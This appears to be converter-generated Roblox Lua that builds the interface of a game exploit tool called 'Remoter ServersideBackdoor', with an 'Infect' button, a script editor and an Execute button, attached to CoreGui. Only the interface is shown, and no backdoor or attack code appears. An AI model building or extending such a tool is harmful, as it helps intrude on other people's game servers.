--[=[
 Remoter Serverside
]=]

-- Instances: 121 | Scripts: 6 | Modules: 16 | Tags: 1
local CollectionService = game:GetService("CollectionService");
local G2L = {};

-- StarterGui.Remoter ServersideBackdoor
G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
G2L["1"]["Name"] = [[Remoter ServersideBackdoor]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.Remoter ServersideBackdoor.Interface
G2L["2"] = Instance.new("Folder", G2L["1"]);
G2L["2"]["Name"] = [[Interface]];


-- StarterGui.Remoter ServersideBackdoor.Interface.Main
G2L["3"] = Instance.new("Frame", G2L["2"]);
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["3"]["Size"] = UDim2.new(0, 550, 0, 350);
G2L["3"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["Name"] = [[Main]];
G2L["3"]["BackgroundTransparency"] = 1;


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.UIDrag
G2L["4"] = Instance.new("LocalScript", G2L["3"]);
G2L["4"]["Name"] = [[UIDrag]];


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.MainAPI
G2L["5"] = Instance.new("LocalScript", G2L["3"]);
G2L["5"]["Name"] = [[MainAPI]];


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Background
G2L["6"] = Instance.new("Frame", G2L["3"]);
G2L["6"]["ZIndex"] = -10;
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
G2L["6"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Name"] = [[Background]];


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Background.DropShadow
G2L["7"] = Instance.new("ImageLabel", G2L["6"]);
G2L["7"]["ZIndex"] = -11;
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["SliceCenter"] = Rect.new(49, 49, 450, 450);
G2L["7"]["ScaleType"] = Enum.ScaleType.Slice;
G2L["7"]["ImageTransparency"] = 0.5;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["7"]["ImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["7"]["Image"] = [[rbxassetid://6015897843]];
G2L["7"]["Size"] = UDim2.new(1, 47, 1, 47);
G2L["7"]["BackgroundTransparency"] = 1;
G2L["7"]["Name"] = [[DropShadow]];
G2L["7"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top
G2L["8"] = Instance.new("Frame", G2L["3"]);
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(37, 37, 37);
G2L["8"]["Size"] = UDim2.new(1, 0, 0, 45);
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Name"] = [[Top]];


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.Title
G2L["9"] = Instance.new("TextLabel", G2L["8"]);
G2L["9"]["BorderSizePixel"] = 0;
G2L["9"]["TextSize"] = 24;
G2L["9"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9"]["TextColor3"] = Color3.fromRGB(151, 151, 151);
G2L["9"]["BackgroundTransparency"] = 1;
G2L["9"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["Text"] = [[Remoter Serverside]];
G2L["9"]["Name"] = [[Title]];


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.Title.UIPadding
G2L["a"] = Instance.new("UIPadding", G2L["9"]);
G2L["a"]["PaddingLeft"] = UDim.new(0, 50);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.Title.Icon
G2L["b"] = Instance.new("ImageLabel", G2L["9"]);
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["b"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["b"]["Image"] = [[rbxassetid://8498174594]];
G2L["b"]["Size"] = UDim2.new(0.03, 20, 0.2, 20);
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["BackgroundTransparency"] = 1;
G2L["b"]["Name"] = [[Icon]];
G2L["b"]["Position"] = UDim2.new(-0.08, 0, 0.5, 0);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.Title.Icon.UIAspectRatioConstraint
G2L["c"] = Instance.new("UIAspectRatioConstraint", G2L["b"]);



-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.Connect
G2L["d"] = Instance.new("TextButton", G2L["8"]);
G2L["d"]["TextWrapped"] = true;
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["d"]["TextSize"] = 15;
G2L["d"]["TextColor3"] = Color3.fromRGB(236, 236, 236);
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["d"]["AnchorPoint"] = Vector2.new(1, 0.5);
G2L["d"]["Size"] = UDim2.new(-0.05, 125, 0.84, -10);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["Text"] = [[Infect]];
G2L["d"]["Name"] = [[Connect]];
G2L["d"]["Position"] = UDim2.new(1.47, -270, 0.5, 0);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.Connect.UIPadding
G2L["e"] = Instance.new("UIPadding", G2L["d"]);
G2L["e"]["PaddingLeft"] = UDim.new(0, 20);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.Connect.Icon
G2L["f"] = Instance.new("ImageLabel", G2L["d"]);
G2L["f"]["BorderSizePixel"] = 0;
G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["f"]["AnchorPoint"] = Vector2.new(1, 0.5);
G2L["f"]["Image"] = [[rbxassetid://85435929620886]];
G2L["f"]["Size"] = UDim2.new(-0.05, 20, -0.11, 20);
G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f"]["BackgroundTransparency"] = 1;
G2L["f"]["Name"] = [[Icon]];
G2L["f"]["Position"] = UDim2.new(0.07, -7, 0.5, 0);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.Connect.Icon.UIAspectRatioConstraint
G2L["10"] = Instance.new("UIAspectRatioConstraint", G2L["f"]);



-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.Connect.UIStroke
G2L["11"] = Instance.new("UIStroke", G2L["d"]);
G2L["11"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["11"]["Color"] = Color3.fromRGB(76, 76, 76);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.R6
G2L["12"] = Instance.new("TextButton", G2L["8"]);
G2L["12"]["TextWrapped"] = true;
G2L["12"]["BorderSizePixel"] = 0;
G2L["12"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["12"]["TextSize"] = 15;
G2L["12"]["TextColor3"] = Color3.fromRGB(236, 236, 236);
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["12"]["AnchorPoint"] = Vector2.new(1, 0.5);
G2L["12"]["Size"] = UDim2.new(-0.05, 125, 0.84, -10);
G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["Text"] = [[R6]];
G2L["12"]["Name"] = [[R6]];
G2L["12"]["Position"] = UDim2.new(1.28, -270, 0.5, 0);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.R6.LocalScript
G2L["13"] = Instance.new("LocalScript", G2L["12"]);



-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.R6.UIPadding
G2L["14"] = Instance.new("UIPadding", G2L["12"]);
G2L["14"]["PaddingLeft"] = UDim.new(0, 20);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.R6.Icon
G2L["15"] = Instance.new("ImageLabel", G2L["12"]);
G2L["15"]["BorderSizePixel"] = 0;
G2L["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["15"]["AnchorPoint"] = Vector2.new(1, 0.5);
G2L["15"]["Image"] = [[rbxassetid://107170038126400]];
G2L["15"]["Size"] = UDim2.new(-0.05, 20, -0.11, 20);
G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15"]["BackgroundTransparency"] = 1;
G2L["15"]["Name"] = [[Icon]];
G2L["15"]["Position"] = UDim2.new(0.07, -7, 0.5, 0);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.R6.Icon.UIAspectRatioConstraint
G2L["16"] = Instance.new("UIAspectRatioConstraint", G2L["15"]);



-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.R6.UIStroke
G2L["17"] = Instance.new("UIStroke", G2L["12"]);
G2L["17"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["17"]["Color"] = Color3.fromRGB(76, 76, 76);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.RE
G2L["18"] = Instance.new("TextButton", G2L["8"]);
G2L["18"]["TextWrapped"] = true;
G2L["18"]["BorderSizePixel"] = 0;
G2L["18"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["18"]["TextSize"] = 15;
G2L["18"]["TextColor3"] = Color3.fromRGB(236, 236, 236);
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["18"]["AnchorPoint"] = Vector2.new(1, 0.5);
G2L["18"]["Size"] = UDim2.new(-0.05, 125, 0.84, -10);
G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18"]["Text"] = [[RE]];
G2L["18"]["Name"] = [[RE]];
G2L["18"]["Position"] = UDim2.new(1.09, -270, 0.5, 0);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.RE.LocalScript
G2L["19"] = Instance.new("LocalScript", G2L["18"]);



-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.RE.UIPadding
G2L["1a"] = Instance.new("UIPadding", G2L["18"]);
G2L["1a"]["PaddingLeft"] = UDim.new(0, 20);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.RE.Icon
G2L["1b"] = Instance.new("ImageLabel", G2L["18"]);
G2L["1b"]["BorderSizePixel"] = 0;
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["1b"]["AnchorPoint"] = Vector2.new(1, 0.5);
G2L["1b"]["Image"] = [[rbxassetid://95334865649966]];
G2L["1b"]["Size"] = UDim2.new(-0.05, 20, -0.11, 20);
G2L["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["BackgroundTransparency"] = 1;
G2L["1b"]["Name"] = [[Icon]];
G2L["1b"]["Position"] = UDim2.new(0.07, -7, 0.5, 0);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.RE.Icon.UIAspectRatioConstraint
G2L["1c"] = Instance.new("UIAspectRatioConstraint", G2L["1b"]);



-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Top.RE.UIStroke
G2L["1d"] = Instance.new("UIStroke", G2L["18"]);
G2L["1d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["1d"]["Color"] = Color3.fromRGB(76, 76, 76);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content
G2L["1e"] = Instance.new("Frame", G2L["3"]);
G2L["1e"]["BorderSizePixel"] = 0;
G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["AnchorPoint"] = Vector2.new(0, 1);
G2L["1e"]["Size"] = UDim2.new(1, 0, 1, -45);
G2L["1e"]["Position"] = UDim2.new(0, 0, 1, 0);
G2L["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e"]["Name"] = [[Content]];
G2L["1e"]["BackgroundTransparency"] = 1;


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor
G2L["1f"] = Instance.new("Frame", G2L["1e"]);
G2L["1f"]["BorderSizePixel"] = 0;
G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(16, 16, 16);
G2L["1f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["Name"] = [[Executor]];
G2L["1f"]["BackgroundTransparency"] = 1;


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Tabs
G2L["20"] = Instance.new("ScrollingFrame", G2L["1f"]);
G2L["20"]["BorderSizePixel"] = 0;
G2L["20"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["20"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20"]["Name"] = [[Tabs]];
G2L["20"]["Selectable"] = false;
G2L["20"]["AutomaticCanvasSize"] = Enum.AutomaticSize.X;
G2L["20"]["Size"] = UDim2.new(1, 0, 0, 40);
G2L["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20"]["ScrollBarThickness"] = 0;
G2L["20"]["BackgroundTransparency"] = 1;


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Tabs.UIListLayout
G2L["21"] = Instance.new("UIListLayout", G2L["20"]);
G2L["21"]["Padding"] = UDim.new(0, 5);
G2L["21"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["21"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Tabs.UIPadding
G2L["22"] = Instance.new("UIPadding", G2L["20"]);
G2L["22"]["PaddingRight"] = UDim.new(0, 5);
G2L["22"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Tabs.ZAdd
G2L["23"] = Instance.new("TextButton", G2L["20"]);
G2L["23"]["BorderSizePixel"] = 0;
G2L["23"]["TextSize"] = 20;
G2L["23"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["23"]["BackgroundColor3"] = Color3.fromRGB(45, 45, 45);
G2L["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["23"]["Size"] = UDim2.new(0, 25, 0, 25);
G2L["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23"]["Text"] = [[+]];
G2L["23"]["Name"] = [[ZAdd]];


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Codebox
G2L["24"] = Instance.new("Frame", G2L["1f"]);
G2L["24"]["BorderSizePixel"] = 0;
G2L["24"]["BackgroundColor3"] = Color3.fromRGB(16, 16, 16);
G2L["24"]["Size"] = UDim2.new(1, 0, 1, -90);
G2L["24"]["Position"] = UDim2.new(0, 0, 0, 40);
G2L["24"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["24"]["Name"] = [[Codebox]];
G2L["24"]["BackgroundTransparency"] = 1;


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Buttons
G2L["25"] = Instance.new("Frame", G2L["1f"]);
G2L["25"]["BorderSizePixel"] = 0;
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["AnchorPoint"] = Vector2.new(0, 1);
G2L["25"]["Size"] = UDim2.new(1, 0, 0, 45);
G2L["25"]["Position"] = UDim2.new(0, 0, 1, 0);
G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["Name"] = [[Buttons]];
G2L["25"]["BackgroundTransparency"] = 1;


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Buttons.Execute
G2L["26"] = Instance.new("TextButton", G2L["25"]);
G2L["26"]["BorderSizePixel"] = 0;
G2L["26"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["26"]["TextSize"] = 15;
G2L["26"]["TextColor3"] = Color3.fromRGB(236, 236, 236);
G2L["26"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["26"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["26"]["AnchorPoint"] = Vector2.new(1, 0.5);
G2L["26"]["Size"] = UDim2.new(0, 125, 1, -10);
G2L["26"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26"]["Text"] = [[Execute]];
G2L["26"]["Name"] = [[Execute]];
G2L["26"]["Position"] = UDim2.new(0.99, 0, 0.35, 0);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Buttons.Execute.UIPadding
G2L["27"] = Instance.new("UIPadding", G2L["26"]);
G2L["27"]["PaddingLeft"] = UDim.new(0, 35);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Buttons.Execute.Icon
G2L["28"] = Instance.new("ImageLabel", G2L["26"]);
G2L["28"]["BorderSizePixel"] = 0;
G2L["28"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["28"]["AnchorPoint"] = Vector2.new(1, 0.5);
G2L["28"]["Image"] = [[rbxassetid://94250258126863]];
G2L["28"]["Size"] = UDim2.new(0.03, 20, 0.08, 20);
G2L["28"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28"]["BackgroundTransparency"] = 1;
G2L["28"]["Name"] = [[Icon]];
G2L["28"]["Position"] = UDim2.new(0.01, -7, 0.5, 0);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Buttons.Execute.Icon.UIAspectRatioConstraint
G2L["29"] = Instance.new("UIAspectRatioConstraint", G2L["28"]);



-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Buttons.Execute.UIStroke
G2L["2a"] = Instance.new("UIStroke", G2L["26"]);
G2L["2a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2a"]["Color"] = Color3.fromRGB(76, 76, 76);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Buttons.UIPadding
G2L["2b"] = Instance.new("UIPadding", G2L["25"]);
G2L["2b"]["PaddingRight"] = UDim.new(0, 5);
G2L["2b"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Buttons.Clear
G2L["2c"] = Instance.new("TextButton", G2L["25"]);
G2L["2c"]["BorderSizePixel"] = 0;
G2L["2c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["2c"]["TextSize"] = 15;
G2L["2c"]["TextColor3"] = Color3.fromRGB(236, 236, 236);
G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["2c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["2c"]["AnchorPoint"] = Vector2.new(1, 0.5);
G2L["2c"]["Size"] = UDim2.new(0, 125, 1, -10);
G2L["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c"]["Text"] = [[Clear]];
G2L["2c"]["Name"] = [[Clear]];
G2L["2c"]["Position"] = UDim2.new(0.99, -135, 0.35, 0);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Buttons.Clear.Icon
G2L["2d"] = Instance.new("ImageLabel", G2L["2c"]);
G2L["2d"]["BorderSizePixel"] = 0;
G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["2d"]["AnchorPoint"] = Vector2.new(1, 0.5);
G2L["2d"]["Image"] = [[rbxassetid://90741188592731]];
G2L["2d"]["Size"] = UDim2.new(0.09, 15, 0.16, 15);
G2L["2d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d"]["BackgroundTransparency"] = 1;
G2L["2d"]["Name"] = [[Icon]];
G2L["2d"]["Position"] = UDim2.new(0.02, -10, 0.5, 0);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Buttons.Clear.Icon.UIAspectRatioConstraint
G2L["2e"] = Instance.new("UIAspectRatioConstraint", G2L["2d"]);



-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Buttons.Clear.UIStroke
G2L["2f"] = Instance.new("UIStroke", G2L["2c"]);
G2L["2f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2f"]["Color"] = Color3.fromRGB(76, 76, 76);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Buttons.Clear.UIPadding
G2L["30"] = Instance.new("UIPadding", G2L["2c"]);
G2L["30"]["PaddingLeft"] = UDim.new(0, 35);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Buttons.Hide
G2L["31"] = Instance.new("TextButton", G2L["25"]);
G2L["31"]["BorderSizePixel"] = 0;
G2L["31"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["31"]["TextSize"] = 15;
G2L["31"]["TextColor3"] = Color3.fromRGB(236, 236, 236);
G2L["31"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["31"]["AnchorPoint"] = Vector2.new(1, 0.5);
G2L["31"]["Size"] = UDim2.new(0, 125, 1, -10);
G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31"]["Text"] = [[Hide]];
G2L["31"]["Name"] = [[Hide]];
G2L["31"]["Position"] = UDim2.new(0.99, -270, 0.35, 0);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Buttons.Hide.LocalScript
G2L["32"] = Instance.new("LocalScript", G2L["31"]);



-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Buttons.Hide.UIPadding
G2L["33"] = Instance.new("UIPadding", G2L["31"]);
G2L["33"]["PaddingLeft"] = UDim.new(0, 35);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Buttons.Hide.Icon
G2L["34"] = Instance.new("ImageLabel", G2L["31"]);
G2L["34"]["BorderSizePixel"] = 0;
G2L["34"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["34"]["AnchorPoint"] = Vector2.new(1, 0.5);
G2L["34"]["Image"] = [[rbxassetid://91515864926349]];
G2L["34"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["34"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["34"]["BackgroundTransparency"] = 1;
G2L["34"]["Name"] = [[Icon]];
G2L["34"]["Position"] = UDim2.new(0, -7, 0.5, 0);


-- StarterGui.Remoter ServersideBackdoor.Interface.Main.Content.Executor.Buttons.Hide.UIStroke
G2L["35"] = Instance.new("UIStroke", G2L["31"]);
G2L["35"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["35"]["Color"] = Color3.fromRGB(76, 76, 76);


-- StarterGui.Remoter ServersideBackdoor.Scripts
G2L["36"] = Instance.new("Folder", G2L["1"]);
G2L["36"]["Name"] = [[Scripts]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Core
G2L["37"] = Instance.new("LocalScript", G2L["36"]);
G2L["37"]["Name"] = [[Core]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Core.TabTemp
G2L["38"] = Instance.new("TextButton", G2L["37"]);
G2L["38"]["BorderSizePixel"] = 0;
G2L["38"]["TextSize"] = 12;
G2L["38"]["TextColor3"] = Color3.fromRGB(151, 151, 151);
G2L["38"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["38"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["38"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["38"]["Size"] = UDim2.new(0, 100, 1, -15);
G2L["38"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["38"]["Text"] = [[Tab 1]];
G2L["38"]["Name"] = [[TabTemp]];
G2L["38"]["Position"] = UDim2.new(0, 0, 0.5, 0);


-- StarterGui.Remoter ServersideBackdoor.Scripts.Core.TabTemp.UIPadding
G2L["39"] = Instance.new("UIPadding", G2L["38"]);
G2L["39"]["PaddingRight"] = UDim.new(0, 5);
G2L["39"]["PaddingLeft"] = UDim.new(0, 5);
G2L["39"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.Remoter ServersideBackdoor.Scripts.Core.TabTemp.Underline
G2L["3a"] = Instance.new("Frame", G2L["38"]);
G2L["3a"]["BorderSizePixel"] = 0;
G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(164, 164, 164);
G2L["3a"]["AnchorPoint"] = Vector2.new(0.5, 1);
G2L["3a"]["Size"] = UDim2.new(0, 0, 0, 1);
G2L["3a"]["Position"] = UDim2.new(0.5, 0, 1, 2);
G2L["3a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a"]["Name"] = [[Underline]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Core.TabTemp.Close
G2L["3b"] = Instance.new("TextButton", G2L["38"]);
G2L["3b"]["BorderSizePixel"] = 0;
G2L["3b"]["TextSize"] = 14;
G2L["3b"]["TextColor3"] = Color3.fromRGB(151, 151, 151);
G2L["3b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3b"]["ZIndex"] = 2;
G2L["3b"]["AnchorPoint"] = Vector2.new(1, 0.5);
G2L["3b"]["BackgroundTransparency"] = 1;
G2L["3b"]["Size"] = UDim2.new(0, 10, 0, 10);
G2L["3b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3b"]["Text"] = [[X]];
G2L["3b"]["Name"] = [[Close]];
G2L["3b"]["Position"] = UDim2.new(1, 0, 0.5, 0);


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules
G2L["3c"] = Instance.new("Folder", G2L["36"]);
G2L["3c"]["Name"] = [[Modules]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu
G2L["3d"] = Instance.new("ModuleScript", G2L["3c"]);
G2L["3d"]["Name"] = [[Kodobokkusu]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Highlighter
G2L["3e"] = Instance.new("ModuleScript", G2L["3d"]);
G2L["3e"]["Name"] = [[Highlighter]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Highlighter.Lexer
G2L["3f"] = Instance.new("ModuleScript", G2L["3e"]);
G2L["3f"]["Name"] = [[Lexer]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.Highlighter.Lexer.Language
G2L["40"] = Instance.new("ModuleScript", G2L["3f"]);
G2L["40"]["Name"] = [[Language]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.CustomInput
G2L["41"] = Instance.new("ModuleScript", G2L["3d"]);
G2L["41"]["Name"] = [[CustomInput]];


-- StarterGui.Remoter ServersideBackdoor.Scripts.Modules.Kodobokkusu.CustomInput.InputCursor
G2L["42"] = Instance.new("Frame", G2L["41"]);
G2L["42"]["ZIndex"] = 5;
G2L["42"]["BorderSizePixel"] = 0;
G2L["42"]["BackgroundColor3"] = Color3.fromRGB(162, 162, 162);
G2L["42"]["Size"] = UDim2.new(0, 1, 0, 16);
G2L["42"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["42"]["Name"] = [[InputCursor]];
G2L["42"]["BackgroundTransparency"] = 1;


